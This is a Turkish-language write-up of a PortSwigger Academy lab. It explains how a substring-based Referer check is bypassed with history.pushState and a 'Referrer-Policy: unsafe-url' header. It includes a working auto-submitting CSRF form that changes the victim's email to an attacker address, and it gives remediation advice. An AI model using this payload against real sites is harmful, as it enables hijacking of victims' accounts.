# CSRF with Broken Referer Validation — Writeup

**Platform:** PortSwigger Web Security Academy
**Tarih:** 2026-11-17

---

## Executive Summary

- **Hedef:** `https://<lab-id>.web-security-academy.net/` (PortSwigger lab)
- **Zorluk:** Orta (Practitioner)
- **Tespit Edilen Zafiyet:** CSRF — savunma Referer header doğrulamasına dayanıyor, ama doğrulama zayıf: Referer'ın **içinde** lab domain'i **geçiyorsa** kabul ediyor (substring kontrolü)
- **Genel Etki:** Saldırgan, kendi exploit URL'ine lab domain'ini gömerek zayıf kontrolü geçip kurbanın e-postasını değiştirebilir
- **Durum:** Tamamlandı — pushState + `Referrer-Policy: unsafe-url` exploit'i teslim edildi, lab çözüldü

---

## Vulnerability Analysis

- **Savunma:** Uygulama CSRF'e karşı **Referer header**'ını kullanıyor. Token yok.
- **Önceki lab'dan farkı (kritik):** Bu lab, Referer **yoksa reddediyor** (`"Invalid referer header"`). Yani `no-referrer` ile susturma burada **işe yaramaz** — "depends on header being present" lab'ının zıttı.
- **Açık:** Referer **varsa**, doğrulama zayıf — Referer string'inin **içinde** lab domain'i geçiyor mu diye bakıyor, host'un gerçekten lab domain'i olup olmadığına değil. Yani `https://evil.com/?lab-domain.net` gibi bir Referer bile "içinde lab domain var" kontrolünü geçer.
- **Kök sebep:** Referer güvenlik için tasarlanmamış bir header, üstüne doğrulama gevşek (substring). Saldırgan Referer'ı hem üretebiliyor hem içeriğini kontrol edebiliyor.

---

## Exploitation

### Mantık: Referer = kaynak URL
Referer, isteğin **geldiği** sayfanın URL'i (submit anı), **gidilen** yer değil. Meşru change-email isteği my-account sayfasından (lab domain'inde) çıkar → Referer doğal olarak lab domain'ini taşır. CSRF isteği exploit-server'dan çıkar → Referer `exploit-server.net` olur, lab domain içermez → red. Bypass için Referer'ı lab domain'i **içerecek** şekilde göstermek gerekiyor.

### 1. Lab domain'ini Referer'a gömmek — `history.pushState`
`pushState`, sayfayı yeniden yüklemeden tarayıcıdaki URL'i değiştirir. **Same-origin kısıtı var:** sadece kendi origin'inde (exploit-server) kalabilirsin, başka domain'e çeviremezsin (yoksa `SecurityError`). O yüzden lab domain'i gerçek bir adres değil, kendi URL'inin query string'ine gömülmüş **string**:
```js
history.pushState("", "", "/?<lab-id>.web-security-academy.net");
// Exploit URL → https://exploit-...exploit-server.net/?<lab-id>.web-security-academy.net
```

### 2. `Referrer-Policy: unsafe-url` — query'nin kırpılmasını engellemek
Tarayıcının **varsayılan** politikası (`strict-origin-when-cross-origin`), **cross-site** bir istekte Referer'ın sadece **origin'ini** gönderir (`https://exploit-...exploit-server.net/`) — query string'i **kırpar.** Lab domain'i query'de olduğu için kırpılırsa Referer'a hiç ulaşmaz → red. Bunu ezmek için exploit server'ın response'una `Referrer-Policy: unsafe-url` header'ı eklenir → tarayıcı **tam URL'i** (query dahil) gönderir.

### 3. Exploit

**Head** (exploit server):
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url
```

**Body:**
```html
<form action="https://<lab-id>.web-security-academy.net/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>
  history.pushState("", "", "/?<lab-id>.web-security-academy.net");
  document.forms[0].submit();
</script>
```

Akış:
1. Kurban exploit sayfasını açar
2. `pushState` → exploit URL'i `https://exploit-...exploit-server.net/?<lab-id>.web-security-academy.net` olur (sayfa yeniden yüklenmez)
3. `document.forms[0].submit()` → change-email'e POST; Referer = o anki URL
4. `unsafe-url` sayesinde Referer **tam** gider (query dahil) → içinde lab domain var
5. Sunucu "Referer'da lab domain geçiyor" → kabul → kurbanın e-postası değişir

### 4. Teslimat
Exploit server → Store → View exploit (test) → Deliver to victim → lab çözüldü.

---

## Remediation

- **Referer'ı güvenlik kontrolü yapma** — bastırılabilir ve içeriği manipüle edilebilir.
- **Zayıf substring kontrolü yerine** Referer'ı doğru parse et: host'un **tam olarak** beklenen domain olduğunu doğrula (query'de geçmesi yetmemeli).
- **CSRF token** (birincil savunma) + SameSite (ikincil). Referer en fazla ek katman.

---

## Gotchas (Dikkat Edilecekler)

- **İki Referer lab'ını KARIŞTIRMA** (bu seansın en pahalı dersi):
  - *"Referer validation depends on header being present"*: Referer **yoksa** kabul → çözüm `no-referrer` (sil).
  - *"Broken Referer validation"* (bu lab): Referer **yoksa** red, içinde domain ara → çözüm pushState + `unsafe-url` (göm).
  - Çözümleri **zıt.** Yanlış lab'a doğru exploit uygularsan saatlerce "neden olmuyor" dersin.
- **Debug'dan önce lab başlığını oku.** Bu lab, yanlış lab'ın (depends-on-present) exploit server'ında test edilerek saatler kaybedildi — başlık satırı (`<title>`/`<h2>`) hangi lab'da olduğunu söyler. Özellikle timeout/reopen sonrası kontrol et.
- **Referer = kaynak URL** (geldiğin sayfa, submit anı), gidilen yer değil. Meşru istek lab içinden çıktığı için Referer doğal lab domain taşır; saldırı dışarıdan çıktığı için taşımaz — kontrol tam bunu yakalar.
- **pushState same-origin kısıtı:** URL'i sadece kendi origin'ine değiştirebilirsin. `https://baska-domain/...` yazarsan `SecurityError`, script çöker. Göreli yol (`/?...`) kullan.
- **Lab domain query'ye string olarak gömülür**, gerçek adres değil. `https://anything.com/` gibi fazladan domain gereksiz (başka tekniğin — `evil.com/?hedef.com` — karışması).
- **`unsafe-url` olmazsa query kırpılır:** varsayılan `strict-origin-when-cross-origin` cross-site'ta sadece origin gönderir. `Referrer-Policy` header'ı çift r ile (`Referrer`), değeri tam `unsafe-url` (sonda fazla karakter yok, yoksa tarayıcı sessizce yok sayar).
- **Head'i Store'la:** exploit server'da Head'e header ekledikten sonra Store'a basmazsan yayına girmez. Teyit: Burp'te exploit sayfasının GET **response**'unda `Referrer-Policy: unsafe-url` görünmeli.
- **Referer'ın kaynağını doğrula (Head kutusu ≠ response):** Head kutusu yazdığın, response sunucunun gönderdiği. Sorun ararken Burp'teki gerçek **response**'a ve change-email isteğinin gerçek **Referer**'ına bak — tahmin etme.
- **Timeout = domain değişir:** lab yeniden açılınca hem lab hem exploit server domain'i değişir. Form action'daki ve pushState'teki domain, açık lab'ın **güncel** domain'iyle birebir aynı olmalı.

---

## Zincir Özeti

```
pushState("", "", "/?<lab-domain>")
  → exploit URL = https://exploit-server.net/?<lab-domain>   (same-origin, reload yok)
form submit → POST change-email, Referer = exploit URL
Referrer-Policy: unsafe-url → Referer tam gider (query dahil)
  → Referer içinde <lab-domain> var
sunucu substring kontrolü "lab domain geçiyor" → kabul
  → e-posta değişir
```
